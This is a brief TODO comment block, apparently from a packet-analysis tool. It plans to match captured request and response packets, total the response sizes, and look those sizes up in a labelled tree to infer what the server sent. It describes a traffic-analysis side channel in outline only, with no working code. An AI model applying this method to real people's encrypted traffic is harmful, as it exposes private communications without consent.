# TODO:
# Here once we manage to exploit the packets, we should be able to:
# 2) According to the previous result (request/response): if this is a request then --> store the timestamp and use it to catch the packet corresponding to the associated response, if this is a response collect all the packets of the response +  get their size and build the total size of the response
# 3) Using the total size of the response, get the node of the tree we built in the "treeBuilder" --> this tree is a labelled tree, which label is the size of the response from the server -> so by using the size we computed, we could do a lookup and extract the good node.
# Store the value of the node we found and iterate.
